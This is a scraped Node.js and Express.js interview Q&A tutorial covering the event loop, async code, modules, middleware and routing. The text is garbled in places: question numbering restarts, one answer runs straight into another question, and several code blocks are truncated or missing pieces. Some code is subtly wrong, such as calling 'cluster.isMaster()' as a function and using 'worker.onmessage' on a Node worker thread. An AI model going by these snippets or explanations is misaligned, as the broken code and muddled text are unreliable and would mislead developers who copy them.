Q.01 What is Node.js? ⭐ Key Concept ▼

Node.js is an open-source, cross-platform JavaScript runtime environment that allows you to execute JavaScript code outside the browser — on the server side. Before Node.js, JavaScript could only run inside web browsers. Node.js changed that by making JavaScript a general-purpose language that can build servers, CLIs, desktop apps, and more.

Node.js was created by Ryan Dahl in 2009. It is built on Google's V8 JavaScript engine (the same engine that powers Chrome), which compiles JavaScript directly to native machine code for extremely fast execution.

Key characteristics:

  • Server-side JS — run JavaScript on the server, handling HTTP requests, databases, file systems, etc.
  • Non-blocking I/O — asynchronous operations don't block the server while waiting for data
  • Single-threaded event loop — handles many concurrent connections efficiently without spawning a new thread per request
  • npm ecosystem — access to 2 million+ packages via the Node Package Manager
  • Same language, full stack — use JavaScript on both frontend and backend, sharing code and logic
javascript — basic node.js server
// server.js — a minimal HTTP server in Node.js
const http = require("http"); // built-in Node.js module

const server = http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("Hello from Node.js!");
});

server.listen(3000, () => {
  console.log("Server running at http://localhost:3000");
});

// Run with: node server.js
// Visit http://localhost:3000 → "Hello from Node.js!"
Q.02 How is Node.js a runtime environment on the server side? What is V8? ⭐ Key Concept ▼

A runtime environment is a software layer that provides all the necessary components to execute a program — memory management, access to system resources, built-in libraries, and the engine to interpret or compile the code. Node.js is a runtime environment for JavaScript on the server side, the same way browsers are runtime environments for JavaScript on the client side.

V8 is Google's open-source high-performance JavaScript and WebAssembly engine, written in C++. It is the core of both Chrome and Node.js. V8's job is to:

  • Parse your JavaScript source code into an Abstract Syntax Tree (AST)
  • Compile it to machine code using JIT (Just-In-Time) compilation — this means JS is compiled at the moment it runs, making it very fast
  • Optimise hot code paths using speculative optimisation and inlining
  • Manage memory — allocate heap memory and run garbage collection

Node.js wraps V8 and adds extra layers on top: libuv (for the event loop and async I/O), the Node standard library (fs, http, crypto, path, etc.), and the npm package ecosystem. Together these form the complete Node.js runtime.

Q.03 What is the difference between a Runtime Environment and a Framework? ⭐ Key Concept ▼

These two terms are often confused but refer to very different things:

  • Runtime Environment — the underlying platform that executes your code. It provides the engine, memory management, I/O access, and system-level APIs. It is the foundation everything runs on top of. Examples: Node.js (JS runtime), the browser (JS runtime), the JVM (Java runtime). You cannot build a web server without a runtime — it is mandatory infrastructure.
  • Framework — a set of pre-written code, conventions, and tools that sit on top of a runtime to help you build specific types of applications faster. It provides structure, patterns, and reusable utilities. Examples: Express.js (web framework on Node.js), React (UI framework in the browser), Spring (Java framework on JVM). Frameworks are optional — you can build without them, just with more manual work.

The relationship: Runtime > Framework > Your Application. The runtime is the ground, the framework is a structure built on that ground, and your app lives inside the structure.

Runtime Environment  →  The land and utilities (electricity, water, roads)
Framework            →  A pre-built house structure on that land
Your Application     →  The furniture and décor you put inside

Node.js  = Runtime (executes JS, provides fs/http/crypto APIs)
Express  = Framework (routing, middleware, request/response helpers)
Your API = Application (your routes, controllers, business logic)
Q.04 What is the difference between Node.js and Express.js? ⭐ Key Concept ▼

Node.js is the runtime environment — it is what lets you run JavaScript on a server. It provides low-level APIs for building servers (http module), but using them directly requires a lot of boilerplate code for routing, parsing request bodies, setting headers, handling errors, etc.

Express.js is a minimal, unopinionated web framework built on top of Node.js. It abstracts away the repetitive low-level plumbing and gives you a clean, concise API for:

  • Defining routes (app.get(), app.post())
  • Middleware pipeline (logging, auth, body parsing)
  • Handling request and response objects
  • Serving static files, templates, JSON APIs
  • Error handling
javascript
// ── Pure Node.js (low level, lots of manual work) ─────────
const http = require("http");
const server = http.createServer((req, res) => {
  if (req.url === "/users" && req.method === "GET") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify([{ id: 1, name: "Arun" }]));
  } else {
    res.writeHead(404);
    res.end("Not Found");
  }
});
server.listen(3000);

// ── Express.js (clean, concise, maintainable) ─────────────
const express = require("express");
const app     = express();

app.use(express.json()); // parse JSON bodies automatically

app.get("/users", (req, res) => {
  res.json([{ id: 1, name: "Arun" }]);
});

app.listen(3000, () => console.log("Server running"));
Q.05 What are the differences between Client-Side (Browser) and Server-Side (Node.js)? ⭐ Key Concept ▼

Both environments run JavaScript, but they have very different capabilities, APIs, and purposes:

  • Environment — Browser JS runs inside the user's browser; Node.js runs on a server or your own machine.
  • Global object — Browser has window, document, navigator. Node.js has global, process, __dirname, __filename.
  • DOM access — Browser JS can manipulate the HTML DOM. Node.js has no DOM — there is no HTML to manipulate on the server.
  • File system — Node.js can read/write files using the fs module. Browsers cannot access the file system for security reasons.
  • Modules — Node.js uses CommonJS (require()) or ESM. Browsers use ESM (import/export) with type="module".
  • Purpose — Browser JS handles UI, events, animations. Node.js handles HTTP requests, databases, authentication, file I/O, microservices.
  • Security model — Browsers sandbox JS tightly (no OS access). Node.js has full OS-level access (file system, network, processes).
javascript
// BROWSER — has window, DOM, fetch, localStorage
document.getElementById("btn").addEventListener("click", () => {
  document.body.style.background = "red"; // DOM manipulation
});
window.localStorage.setItem("theme", "dark");

// NODE.JS — has fs, http, process, no DOM
const fs = require("fs");
fs.readFile("data.json", "utf8", (err, data) => { // file system access
  console.log(JSON.parse(data));
});
console.log(process.env.NODE_ENV);  // environment variables
console.log(__dirname);              // current directory path
// document.getElementById(...) ❌ — ReferenceError, no DOM in Node!

Q.01 What are the 7 Main Features of Node.js? ⭐ Key Concept ▼

Node.js is popular for backend development because of these seven defining characteristics that set it apart from traditional server-side technologies:

  • 1. Asynchronous & Non-Blocking I/O — Operations like reading files or querying databases don't block execution. Node kicks them off and moves on; a callback/promise handles the result when ready.
  • 2. Single-Threaded Event Loop — Unlike Java or PHP which create a new thread per request, Node handles all requests in a single thread using an event loop, making it highly memory-efficient.
  • 3. Fast Execution via V8 — Google's V8 engine compiles JavaScript to machine code using JIT compilation, making Node.js extremely fast.
  • 4. Event-Driven Architecture — Node.js uses an event emitter pattern. When an event occurs (data ready, connection opened), the registered callback fires.
  • 5. Cross-Platform — Node.js runs on Windows, Linux, and macOS without modification.
  • 6. npm Ecosystem — Access to the world's largest package registry (2M+ packages) via npm or yarn for rapid development.
  • 7. Scalable & Lightweight — Ideal for microservices and real-time apps (chat, live updates) that need to handle thousands of concurrent connections with low memory overhead.
javascript
// Non-blocking I/O — Node doesn't wait for file read
const fs = require("fs");

console.log("1. Start");

fs.readFile("big-file.txt", "utf8", (err, data) => {
  console.log("3. File read done"); // fires when ready
});

console.log("2. This runs BEFORE file is read"); // doesn't wait
// Output: 1 → 2 → 3 (non-blocking!)
Q.02 What is Single-Threaded Programming? ⭐ Key Concept ▼

In single-threaded programming, a program has only one thread of execution — meaning it can only do one thing at a time. There is one call stack, and code runs sequentially on it. One operation must complete before the next begins.

JavaScript (and therefore Node.js) is single-threaded. This sounds limiting, but combined with an asynchronous, non-blocking event loop, it becomes a strength — Node can handle thousands of concurrent I/O operations without the overhead of managing multiple threads, which simplifies code and avoids complex threading bugs like race conditions and deadlocks.

Important distinction: Node.js itself is single-threaded for JavaScript execution, but the underlying libuv library uses a thread pool (default 4 threads) for heavy operations like file I/O and DNS lookups — so those don't actually block.

javascript
// Single thread — one thing at a time on the call stack
function taskA() { console.log("Task A"); }
function taskB() { console.log("Task B"); }
function taskC() { console.log("Task C"); }

taskA(); taskB(); taskC();
// Always: Task A → Task B → Task C (sequential, predictable)

// Problem: CPU-heavy work BLOCKS everything
function heavyWork() {
  let sum = 0;
  for (let i = 0; i < 1e9; i++) sum += i; // blocks for ~1 second!
  return sum;
}
// Solution: offload to Worker Threads or child_process
const { Worker } = require("worker_threads");
// Worker runs in separate thread, doesn't block main thread
Q.03 What is Synchronous Programming? ▼

In synchronous programming, operations execute in strict sequence — line by line, top to bottom. Each line of code must fully complete before the next line begins. The program waits (blocks) for each operation to finish before moving on.

This is the natural, intuitive model — easy to read and reason about. The problem arises with slow operations: if reading a file takes 2 seconds, the entire program freezes for those 2 seconds. In a server context, this means no other requests can be handled while waiting.

javascript
// Synchronous — blocks until each operation completes
const fs = require("fs");

console.log("Before read");

// readFileSync BLOCKS — program waits here until file is read
const data = fs.readFileSync("file.txt", "utf8");
console.log("File contents:", data);

console.log("After read"); // only runs AFTER file is fully read

// Output always in order: Before → File contents → After

// Synchronous is fine for scripts, startup config, CLI tools
// but DANGEROUS in a web server — blocks all other requests!

// Real example: reading config on startup (ok to block once)
const config = JSON.parse(fs.readFileSync("config.json", "utf8"));
console.log("App port:", config.port);
Q.04 What is Multi-Threaded Programming? ▼

In multi-threaded programming, a program runs multiple threads simultaneously — each thread is an independent execution flow that can run on a different CPU core. Different tasks run truly in parallel, and slow operations in one thread don't block others.

Traditional server languages like Java, PHP, Ruby on Rails handle concurrent HTTP requests with multi-threading: each incoming request gets its own thread. While this works, threads are expensive — each one consumes memory (~1-8 MB of stack) and switching between them has overhead (context switching).

Node.js deliberately avoids traditional multi-threading for request handling. Instead it uses a single thread + event loop, which is more efficient for I/O-bound workloads. However, Node does provide Worker Threads for CPU-intensive tasks that would otherwise block the main thread.

javascript
// Node.js Worker Threads — for CPU-intensive work
const { Worker, isMainThread, parentPort } = require("worker_threads");

if (isMainThread) {
  // Main thread — creates workers for heavy tasks
  const worker = new Worker(__filename);
  worker.onmessage = (result) => {
    console.log("Result from worker:", result.data);
  };
  console.log("Main thread still free!"); // not blocked
} else {
  // Worker thread — runs heavy calculation separately
  let sum = 0;
  for (let i = 0; i < 1e9; i++) sum += i;
  parentPort.postMessage(sum); // send result back to main
}

// libuv thread pool (used internally for fs, dns, crypto)
// Default 4 threads — can be increased:
// process.env.UV_THREADPOOL_SIZE = 8;
Q.05 What is Asynchronous Programming? ▼

In asynchronous programming, operations that take time (I/O, network, timers) are started and then execution moves on immediately to the next task — without waiting for them to complete. When the operation finishes, a callback, Promise resolution, or async/await resumes handling its result.

This is the foundation of how Node.js handles scalability. Instead of a thread sitting idle waiting for a database query, Node starts the query, moves on to handle other requests, and comes back to process the database result when it arrives. One thread doing many things via the event loop — far more efficient than many threads each waiting.

javascript
// Asynchronous — non-blocking, returns immediately
const fs = require("fs");

console.log("1. Start");

// fs.readFile does NOT block — hands off to OS, continues
fs.readFile("file.txt", "utf8", (err, data) => {
  // This callback fires LATER when the OS finishes reading
  if (err) throw err;
  console.log("3. File contents:", data);
});

console.log("2. This runs BEFORE file read completes");
// Output: 1 → 2 → 3

// Modern async/await — cleaner syntax
const { readFile } = require("fs").promises;

async function loadData() {
  console.log("1. Start");
  const data = await readFile("file.txt", "utf8"); // pauses here only
  console.log("2. File:", data);
}
loadData();
console.log("3. Still runs before file read");
Q.06 What is the difference between Synchronous and Asynchronous programming? ⭐ Key Concept ▼

The core difference is how the program handles waiting for slow operations:

  • Synchronous — blocks the execution thread until the operation finishes. Simple and predictable, but every slow operation freezes everything. Use for startup scripts, CLI tools, or one-time config reads.
  • Asynchronous — starts the operation and immediately moves on. A callback/promise handles the result later. More complex to write, but the thread stays free to handle other work. Essential for servers handling many concurrent requests.
javascript
const fs = require("fs");

// SYNCHRONOUS — blocks, sequential
console.log("A");
const d = fs.readFileSync("file.txt", "utf8"); // waits here
console.log("B"); // runs only after file read
// Output: A → B

// ASYNCHRONOUS — non-blocking
console.log("A");
fs.readFile("file.txt", "utf8", (err, d) => {
  console.log("C"); // runs when ready
});
console.log("B"); // runs immediately, doesn't wait
// Output: A → B → C

// ┌──────────────────┬───────────────────────────────────┐
// │                  │ Sync            │ Async            │
// ├──────────────────┼─────────────────┼──────────────────┤
// │ Blocks thread    │ ✅ Yes          │ ❌ No            │
// │ Order guaranteed │ ✅ Always       │ ❌ Depends       │
// │ Scalability      │ ❌ Poor         │ ✅ Excellent     │
// │ Code complexity  │ ✅ Simple       │ ⚠️ Higher       │
// │ Use in server?   │ ❌ Avoid        │ ✅ Always        │
// └──────────────────┴─────────────────┴──────────────────┘
Q.07 What are Events, Event Emitter, Event Queue, Event Loop and Event-Driven? ⭐ Key Concept ▼

These five concepts together explain how Node.js achieves asynchronous, non-blocking behaviour with a single thread:

  • Events — signals that something has happened: a file finished reading, a client connected, a timer expired, an HTTP request arrived. Everything in Node is event-based.
  • Event Emitter — a Node.js class (require('events')) that lets objects emit named events and register listeners for them. Most Node.js core APIs (streams, http, fs) are built on EventEmitter.
  • Event Queue (Task Queue) — a queue that holds callbacks ready to execute — callbacks whose associated async operations have completed and are waiting for the call stack to be empty.
  • Event Loop — the heart of Node.js. It continuously checks: "Is the call stack empty? Is there anything in the queue?" If yes to both, it moves the next callback from the queue onto the stack to execute. This loop runs forever while the process is alive.
  • Event-Driven — a programming paradigm where the flow of the program is determined by events. Instead of calling functions imperatively, you register listeners and react when events fire.
javascript
// EventEmitter — custom events
const EventEmitter = require("events");
const emitter      = new EventEmitter();

// Register listener (like addEventListener in browser)
emitter.on("userLogin", (user) => {
  console.log(`User logged in: ${user.name}`);
});
emitter.on("userLogin", (user) => {
  logToDatabase(user); // multiple listeners on same event
});

// Emit the event (trigger all listeners)
emitter.emit("userLogin", { name: "Arun", id: 1 });

// Once listener — fires only first time
emitter.once("connect", () => console.log("Connected!"));

// Event Loop phases (simplified):
// 1. timers       — setTimeout/setInterval callbacks
// 2. I/O          — fs, network callbacks
// 3. idle/prepare — internal use
// 4. poll         — wait for new I/O events
// 5. check        — setImmediate callbacks
// 6. close        — socket.on('close') callbacks
Q.08 What are the main features and advantages of Node.js? ⭐ Key Concept ▼

Node.js has become one of the most popular backend technologies because of these key advantages:

  • High performance — V8's JIT compilation and non-blocking I/O make Node extremely fast for I/O-heavy workloads. Benchmark comparisons show Node handling significantly more requests/sec than traditional threaded servers for I/O-bound tasks.
  • Scalability — The event loop handles thousands of concurrent connections with minimal memory. Horizontal scaling via the cluster module spawns one process per CPU core.
  • Full-stack JavaScript — Use the same language (JS) and share code (validation, types, utilities) between frontend and backend. Reduces context switching for developers.
  • Large ecosystem (npm) — 2M+ packages available. Almost any functionality you need already has a well-maintained package.
  • Real-time capability — WebSockets + event-driven architecture make Node ideal for chat apps, live dashboards, collaborative tools, and streaming.
  • Microservices friendly — Lightweight and fast to start up. Perfect for building small, independent services.
  • Active community — Huge global community, corporate backing (OpenJS Foundation, Microsoft, Netflix, PayPal), and frequent updates.

const cluster = require("cluster");
const os      = require("os");

if (cluster.isMaster()) {

Q.09 What are the disadvantages of Node.js? When to use and when not to use it? ⭐ Key Concept ▼

Node.js is powerful but not the right tool for every job. Understanding its limitations is as important as knowing its strengths:

Disadvantages:

  • Not suitable for CPU-intensive tasks — Heavy computation (image processing, video encoding, machine learning, complex math) blocks the single thread and makes the server unresponsive. Other languages with native multithreading (Python, Java, Go) handle this better.
  • Callback complexity — Even with Promises and async/await, complex async flows can still be hard to manage. Error handling across async chains requires care.
  • JavaScript limitations — Loose typing (though TypeScript solves this), single paradigm challenges for very large codebases.
  • Immature tooling for some domains — Less mature than Java or Python for scientific computing, data science, or enterprise ERP systems.
  • Callback hell in legacy code — Old Node codebases can be hard to read with deeply nested callbacks.

Use Node.js for:

  • REST APIs and GraphQL servers
  • Real-time apps (chat, live notifications, collaborative tools)
  • Streaming data (Netflix, video processing pipelines)
  • Microservices architectures
  • CLI tools and build tools (webpack, eslint)
  • BFF (Backend for Frontend) layers

Avoid Node.js for:

  • Heavy CPU-bound computation (video encoding, ML training)
  • Applications requiring strict relational data consistency (use Java/Spring or Go)
  • Simple CRUD with no real-time needs (PHP/Laravel or Django may be simpler)
javascript
// ❌ Bad use case — CPU-heavy work blocks server
app.get("/compute", (req, res) => {
  let result = 0;
  for (let i = 0; i < 1e10; i++) result += i; // blocks ALL requests!
  res.json({ result });
});

// ✅ Fix — offload to worker thread
const { Worker } = require("worker_threads");
app.get("/compute", (req, res) => {
  const worker = new Worker("./compute-worker.js");
  worker.on("message", result => res.json({ result }));
});

// ✅ Great use case — I/O-heavy API server
app.get("/users", async (req, res) => {
  const users = await db.query("SELECT * FROM users");
  // While DB query runs, event loop handles other requests ✅
  res.json(users);
});

Q.01 How to set up a Node.js project? ⭐ Key Concept ▼

Setting up a Node.js project involves a few straightforward steps. The key tool is npm (Node Package Manager), which comes bundled with Node.js and manages your project dependencies, scripts, and metadata.

Q.04 What are Modules in Node? What is the difference between a function and a module? ⭐ Key Concept ▼

In Node.js, a module is a self-contained JavaScript file. Every .js file is its own module with a private scope — variables and functions are not accessible from outside unless explicitly exported.

  • Function — a reusable block of code that performs a single task. Lives inside a file. Has its own local scope.
  • Module — a complete self-contained file that can contain many functions, classes, and variables. It is the unit of code organisation. It chooses what to expose via exports.

Think of a module as a toolbox, and functions as the individual tools inside it.

javascript — math.js (a module)
const PI = 3.14159; // private — not exported

function add(a, b)      { return a + b; }
function subtract(a, b) { return a - b; }
function circleArea(r)  { return PI * r * r; }

module.exports = { add, subtract, circleArea };
javascript — app.js
const math = require("./math");
math.add(2, 3);       // 5
math.circleArea(5);  // 78.53
// math.PI            ← undefined — private, not exported
Q.05 How many ways are there to export a module? ⭐ Key Concept ▼

Node.js supports two module systems — CommonJS (CJS) (the default) and ES Modules (ESM). Each has multiple ways to export:

javascript — commonjs (default)
// Method 1: module.exports = object
function add(a, b) { return a + b; }
module.exports = { add };

// Method 2: module.exports = single value/class
module.exports = function(name) { return `Hello ${name}`; };
module.exports = class UserService { /* ... */ };

// Method 3: exports.key = value (shorthand)
exports.add      = (a, b) => a + b;
exports.subtract = (a, b) => a - b;
// ⚠️ Never do: exports = {...} — breaks the reference!

// Method 4: property by property
module.exports.add      = (a, b) => a + b;
module.exports.subtract = (a, b) => a - b;
javascript — es modules (type:module)
// Named exports
export const PI = 3.14159;
export function add(a, b) { return a + b; }
export class UserService { /* ... */ }

// Default export (one per file)
export default function main() { /* ... */ }

// Import
import main, { PI, add } from "./math.js";
Q.06 What will happen if you don't export the module? ▼

If you don't export anything, module.exports defaults to an empty object {}. Requiring that file gives you an empty object — not an error. Q.09 What is the role of the createServer() method of the http module? ⭐ Key Concept ▼

http.createServer(callback) creates and returns an HTTP server instance. The callback is called on every incoming request with two arguments: req (the request) and res (the response). It is shorthand for server.on("request", handler) since the server is an EventEmitter.

javascript
const http   = require("http");

const server = http.createServer((req, res) => {
  // req.method   → "GET", "POST", "PUT", "DELETE"
  // req.url      → "/users", "/users/1"
  // req.headers  → { "content-type": "application/json" }

  if (req.method === "GET" && req.url === "/health") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ status: "ok" }));

  } else if (req.method === "POST" && req.url === "/users") {
    let body = "";
    req.on("data", chunk => body += chunk.toString());
    req.on("end",  () => {
      const user = JSON.parse(body);
      res.writeHead(201);
      res.end(JSON.stringify({ created: user }));
    });

  } else {
    res.writeHead(404);
    res.end("Not Found");
  }
});

// Start listening
server.listen(3000, () => console.log("Server on port 3000"));

// Graceful shutdown
process.on("SIGTERM", () => server.close(() => process.exit(0)));

Q.01 What is Middleware in Express.js and when to use it? ⭐ Key Concept ▼

Middleware is any function that has access to the req (request) object, the res (response) object, and a next function in the Express request-response cycle. Middleware functions sit between the incoming request and the final route handler — forming a pipeline. Each middleware can read/modify req and res, then either end the response or call next() to pass control to the next middleware.

When to use middleware:

  • Logging every incoming request (morgan)
  • Parsing request bodies (JSON, form data, multipart)
  • Authentication and authorization checks
  • Rate limiting and CORS headers
  • Data validation before it reaches the route handler
  • Attaching user info to the request object
  • Centralised error handling
  • Compression, caching, response headers
javascript
// Middleware signature: (req, res, next)
function logger(req, res, next) {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next(); // pass control to next middleware/route
}

function authenticate(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  req.user = verifyToken(token); // attach user to request
  next();
}

// Request pipeline: logger → authenticate → route handler
app.use(logger);
app.use(authenticate);
app.get("/profile", (req, res) => res.json(req.user));
Q.02 How do you implement middleware in Express.js? ⭐ Key Concept ▼

Middleware is implemented as a function with signature (req, res, next) and registered with app.use() or directly on a route. Middleware runs in the order it is defined — order matters significantly.

javascript
const express = require("express");
const app     = express();

// ── 1. Inline middleware ───────────────────────────────
app.use((req, res, next) => {
  console.log("Request received");
  next();
});

// ── 2. Named middleware function ───────────────────────
function requestTimer(req, res, next) {
  req.startTime = Date.now();
  res.on("finish", () => {
    console.log(`${req.method} ${req.url} — ${Date.now() - req.startTime}ms`);
  });
  next();
}
app.use(requestTimer);

// ── 3. Middleware on a specific route ─────────────────
app.get("/admin", authenticate, (req, res) => {
  res.json({ panel: "Admin data" });
});

// ── 4. Multiple middlewares on one route ──────────────
app.post("/users",
  authenticate,
  validateBody,
  rateLimiter,
  async (req, res) => {
    const user = await User.create(req.body);
    res.status(201).json(user);
  }

Q.03 What is the purpose of the app.use() function in Express.js? ⭐ Key Concept ▼

app.use() is the primary method to mount middleware in Express. It registers a middleware function (or a router) that runs for every incoming request matching the optional path prefix. If no path is given, it runs for ALL routes. Unlike app.get() which matches only GET and exact paths, app.use() matches any HTTP method and any path that starts with the given prefix.

javascript
// No path — runs for ALL requests
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(morgan("dev"));

// With path prefix — runs only for /api/... routes
app.use("/api", apiRouter);
app.use("/api/users", userRoutes);

// Serve static files from /public folder
app.use("/static", express.static("public"));

// app.use vs app.get:
app.use("/users", mw);   // matches GET /users, POST /users, /users/123 etc.
app.get("/users", mw);   // matches ONLY GET /users (exact)

// Order matters — middleware executes top to bottom
app.use(logger);         // 1st
app.use(authenticate);  // 2nd
app.use(router);         // 3rd
Q.04 What is the purpose of the next parameter in Express.js? ⭐ Key Concept ▼

The next parameter is a callback function provided by Express. Calling next() passes control to the next middleware or route handler in the pipeline. If you don't call next() and don't send a response, the request will hang forever — the client waits indefinitely. Calling next(error) skips all remaining normal middleware and jumps directly to the error-handling middleware.

javascript
// next() — move to next middleware
app.use((req, res, next) => {
  console.log("Middleware 1");
  next(); // must call this or send response
});
app.use((req, res, next) => {
  console.log("Middleware 2"); // runs because next() was called above
  next();
});

// next(error) — skip to error handler
app.get("/users/:id", async (req, res, next) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return next(new Error("User not found"));
    res.json(user);
  } catch (err) {
    next(err); // forwards error to error-handling middleware
  }
});

// next("route") — skip remaining handlers in current route, try next route
app.get("/special",
  (req, res, next) => {
    if (!req.user?.isAdmin) return next("route"); // skip to next route
    res.json({ admin: true });
  },
  (req, res) => res.json({ admin: false }) // this runs if next("route") called
);

Q.06 What is the Request Pipeline in Express? ⭐ Key Concept ▼

The Request Pipeline (or middleware stack) is the ordered sequence of middleware functions that every incoming HTTP request flows through before a final response is sent. Each function in the pipeline can inspect and modify the request and response, then either send the response or call next() to continue to the next function.

Think of it like an assembly line — each station does a specific job to the request before passing it along. If any station sends a response, the pipeline stops there.

text — pipeline flow
Incoming Request
       |
       v
  [Logger MW]          — logs method, url, timestamp
       |  next()
       v
  [CORS MW]            — adds CORS headers
       |  next()
       v
  [Body Parser MW]     — parses JSON body → req.body
       |  next()
       v
  [Auth MW]            — verifies token → req.user
       |  next()
       v
  [Rate Limiter MW]    — check request count
       |  next()
       v
  [Route Handler]      — business logic, sends response
       |
       v
  Response sent to client

  (If any MW calls next(err) → jumps to Error Handler MW)
javascript
// Pipeline defined in order
app.use(morgan("dev"));                          // 1. Logger
app.use(cors());                                  // 2. CORS
app.use(express.json());                          // 3. Body parser
app.use(authenticate);                            // 4. Auth
app.use(rateLimit({ windowMs: 60000, max: 100 })); // 5. Rate limit
app.use("/api", apiRouter);                       // 6. Routes
app.use(errorHandler);                            // 7. Error handler (last)

📎 Express - Types of Middlewares

8 questions
Q.01 What are the types of middlewares in Express.js? ⭐ Key Concept ▼

Express.js categorises middleware into five types based on their scope, source, and purpose:

  • 1. Application-level middleware — bound to the app object using app.use() or app.METHOD(). Runs for all routes or a path prefix.
  • 2. Route-level middleware — bound to an express.Router() instance. Works identically to application-level but scoped to a router.
  • 3. Error-handling middleware — a special middleware with 4 parameters (err, req, res, next). Only called when an error is passed to next(err). Must be registered last.
  • 4. Built-in middleware — provided by Express itself: express.json(), express.urlencoded(), express.static().
  • 5. Third-party middleware — installed from npm and plugged in: morgan, cors, helmet, multer, express-rate-limit.
Q.02 What is the difference between application-level and route-level middleware? ⭐ Key Concept ▼

The key difference is scope — which requests each type applies to:

  • Application-level — bound to the main app object. Applies to all routes or a path prefix across the entire application.
  • Route-level — bound to an express.Router() instance. Only applies to routes defined on that router. Ideal for grouping related routes with their own middleware (e.g., all /api/admin routes require admin auth).
javascript
// APPLICATION-LEVEL — on app object

app.use(express.json());    // all routes

adminRouter.get("/users",    (req, res) => res.json(["user1"]));
adminRouter.delete("/users/:id", (req, res) => res.json({ deleted: true }));

// Mount the router on app at /admin prefix
app.use("/admin", adminRouter);
Q.03 What is error handling middleware and how to implement it? ⭐ Key Concept ▼

Error-handling middleware is a special type of middleware that has exactly 4 parameters: (err, req, res, next). Express recognises it as an error handler specifically because of this 4-parameter signature. It only runs when next(err) is called somewhere in the pipeline, or when an unhandled error is thrown in a route. It must be registered after all routes.

javascript
// Route throws or calls next(err)
app.get("/users/:id", async (req, res, next) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) {
      const err = new Error("User not found");
      err.status = 404;
      return next(err); // forwards to error handler
    }
    res.json(user);
  } catch(err) {
    next(err); // DB errors go to error handler
  }
});

// 404 handler — catch unmatched routes
app.use((req, res, next) => {
  const err = new Error(`Route ${req.url} not found`);
  err.status = 404;
  next(err);
});

// Error-handling middleware — MUST have 4 params, MUST be last
app.use((err, req, res, next) => {
  const status  = err.status || 500;
  const message = err.message || "Internal Server Error";

  console.error(`[ERROR] ${status}: ${message}`, err.stack);

  res.status(status).json({
    success: false,
    error:   message,
    // stack: process.env.NODE_ENV === "development" ? err.stack : undefined
  });
});
Q.04 If you have 5 middlewares, in which one should you do error handling? ▼

Error handling should always be done in the last middleware — always at the very end of the middleware stack, after all routes. Express identifies error-handling middleware by its 4-parameter signature (err, req, res, next) and only calls it when an error is passed to next(err). If you put it in the middle, errors thrown by later middleware won't reach it.

javascript
// ✅ Correct order — error handler LAST
app.use(morgan("dev"));         // MW 1 — logging
app.use(express.json());       // MW 2 — body parsing
app.use(authenticate);         // MW 3 — auth
app.use("/api", apiRouter);    // MW 4 — routes
app.use(notFoundHandler);      // MW 5 — 404 catch-all
app.use(errorHandler);         // MW 6 — ERROR HANDLER (always last)

// ❌ Wrong — error handler in middle misses later errors
app.use(errorHandler);         // errors from below won't reach this
app.use(authenticate);         // errors here won't be caught above!
app.use(apiRouter);

Q.08 What are the advantages of using middleware in Express.js? ▼

Middleware is what makes Express applications scalable and maintainable. The key advantages are:

  • Separation of concerns — authentication, logging, validation, and business logic each live in their own focused function. Routes stay clean.
  • Code reusability — write auth middleware once, reuse it on any route across the app without repeating the logic.
  • Composability — chain multiple middleware functions to build complex request processing pipelines in a readable, declarative way.
  • Centralized error handling — one error-handling middleware catches all errors from all routes, giving you consistent error responses.
  • Modular architecture — each middleware does one thing well, making individual pieces easy to test, replace, or remove.
  • Extensibility — plug in any of thousands of third-party middleware packages to add functionality without reinventing the wheel.
  • Request/Response transformation — parse, validate, sanitise, or augment the req/res objects before they reach your business logic.

  // auth check
  // body validation
  // rate limiting check
  // actual business logic
  // error handling

Q.01 What is Routing in Express.js? ⭐ Key Concept ▼

Routing is the mechanism that determines how an application responds to a client request at a specific URL path and HTTP method (GET, POST, PUT, DELETE, etc.). In Express, a route definition has three parts: the HTTP method, the path (URL pattern), and the handler function that runs when the route is matched.

Routing is how you map URLs to logic — when a user hits GET /users, Express knows to run the "get all users" logic; when they hit POST /users, it runs "create user" logic instead.

javascript
const express = require("express");
const app     = express();
app.use(express.json());

// Route structure: app.METHOD(PATH, HANDLER)

app.get("/users", (req, res) => {        // GET  /users
  res.json([{ id: 1, name: "Arun" }]);
});

app.post("/users", (req, res) => {       // POST /users
  res.status(201).json({ created: req.body });
});

app.put("/users/:id", (req, res) => {   // PUT  /users/:id
  res.json({ updated: req.params.id });
});

app.delete("/users/:id", (req, res) => {// DELETE /users/:id
  res.json({ deleted: req.params.id });
});

app.all("/ping", (req, res) => {         // ALL methods
  res.send("pong");
});

app.listen(3000);
Q.02 What is the difference between middleware and routing in Express? ⭐ Key Concept ▼

Both middleware and routes are functions with (req, res, next) but they serve different purposes:

  • Middleware — a function that runs before the route handler to process, transform, or guard the request. It typically calls next() to pass control along. It is not the final destination — it's a step in the pipeline. Examples: logging, authentication, body parsing, rate limiting.
  • Route handler — the final destination for a request. It matches a specific HTTP method + path combination, contains the business logic, and sends the response. It usually doesn't call next().
javascript
// MIDDLEWARE — processes and passes along
function authenticate(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  req.user = verifyToken(token);
  next(); // passes to next middleware or route
}

// ROUTE — final destination, sends response
app.get("/profile", authenticate, (req, res) => {
  // authenticate ran first, now this is the final handler
  res.json(req.user); // sends response — no next() needed
});

// Key differences:
// Middleware: any path, any method, calls next()
// Route:      specific path + method, sends response

Route handlers are the callback functions that execute when a route is matched. Q.06 What are Route Parameters in Express.js? ⭐ Key Concept ▼

Route parameters are named URL segments prefixed with a colon (:) in the route path. They capture dynamic values from the URL and make them available via req.params. They are different from query parameters (?key=value) which are available via req.query.

javascript
// Single param: GET /users/42
app.get("/users/:id", (req, res) => {
  console.log(req.params.id); // "42"
  res.json({ userId: req.params.id });
});

// Multiple params: GET /users/5/posts/10
app.get("/users/:userId/posts/:postId", (req, res) => {
  const { userId, postId } = req.params;
  res.json({ userId, postId }); // { userId: "5", postId: "10" }
});

// Optional param using ?
app.get("/files/:filename?", (req, res) => {
  const file = req.params.filename || "index";
  res.json({ file });
});

// Query params vs Route params
// GET /search?q=node&page=2
app.get("/search", (req, res) => {
